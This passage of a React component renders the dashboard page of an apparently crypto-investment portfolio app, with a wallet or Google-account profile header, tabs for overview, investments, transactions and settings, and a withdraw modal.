        </div>
      </div>
    );
  }

  const tabs = [
    { id: "overview", label: "Overview" },
    { id: "investments", label: "Investments" },
    { id: "transactions", label: "Transactions" },
    { id: "settings", label: "Settings" },
  ];

  return (
    <main
      className="relative min-h-screen text-white overflow-hidden"
      style={{
        backgroundImage: "linear-gradient(rgba(2,6,23,0.3), rgba(2,6,23,0.4)), url('/images/ai-network-bg.jpg')",
        backgroundSize: "cover",
        backgroundPosition: "center",
        backgroundAttachment: "fixed",
      }}
    >
      <div className="absolute inset-0 bg-slate-950/80 pointer-events-none" />

      <div className="relative z-10 max-w-7xl mx-auto px-4 md:px-6 lg:px-10 py-8 md:py-12">
        {/* Profile Header */}
        <div className="rounded-2xl border border-slate-700/50 bg-slate-900/60 backdrop-blur-xl p-5 md:p-7 mb-6 flex flex-col sm:flex-row sm:items-center sm:justify-between gap-4">
          <div className="flex items-center gap-4">
            <div className="w-12 h-12 md:w-14 md:h-14 rounded-xl bg-gradient-to-br from-blue-600 to-violet-600 flex items-center justify-center text-white text-lg font-bold shadow-lg shadow-blue-500/20 flex-shrink-0">
              {isConnected ? (address?.slice(2, 4).toUpperCase() || "?") : (session?.user?.name?.slice(0, 2).toUpperCase() || "G")}
            </div>
            <div className="min-w-0">
              <div className="text-base md:text-lg font-bold text-white">
                {isGoogleAuth && !isConnected ? (session?.user?.name || "My Portfolio") : "My Portfolio"}
              </div>
              <div className="text-slate-500 font-mono text-xs truncate mt-0.5">
                {isConnected ? address : session?.user?.email || ""}
              </div>
              <div className="inline-flex items-center gap-1.5 mt-1.5 px-2.5 py-0.5 rounded-full bg-green-500/15 border border-green-500/25 text-green-400 text-xs font-semibold">
                <span className="w-1.5 h-1.5 rounded-full bg-green-400 animate-pulse" />
                Connected
              </div>
            </div>
          </div>
          <Link href="/" className="w-full sm:w-auto px-4 py-2 rounded-lg border border-slate-700/50 text-slate-400 hover:text-white hover:border-slate-500 transition text-sm font-medium text-center">
            ← Back to Home
          </Link>
        </div>

        {/* Tabs */}
        <div className="flex gap-1 mb-6 overflow-x-auto pb-1 -mx-4 px-4 md:mx-0 md:px-0">
          {tabs.map((tab) => (
            <button
              key={tab.id}
              onClick={() => setActiveTab(tab.id)}
              className={`px-4 md:px-5 py-2.5 rounded-lg font-semibold text-sm whitespace-nowrap flex-shrink-0 transition ${
                activeTab === tab.id
                  ? "bg-slate-700/80 text-white border border-slate-600/50"
                  : "text-slate-500 hover:text-slate-300"
              }`}
            >
              {tab.label}
            </button>
          ))}
        </div>

        {/* Content */}
        {activeTab === "overview" && (
          <OverviewSection stats={stats} onWithdraw={() => setShowWithdrawModal(true)} address={address} prices={prices} />
        )}
        {activeTab === "investments" && <InvestmentsSection address={address} />}
        {activeTab === "transactions" && <TransactionsSection />}
        {activeTab === "settings" && <SettingsSection address={address} />}
      </div>

      <WithdrawModal
        isOpen={showWithdrawModal}
        onClose={() => setShowWithdrawModal(false)}
        wallet={address || ""}
        balance={stats.totalBalance}
      />
    </main>
  );
}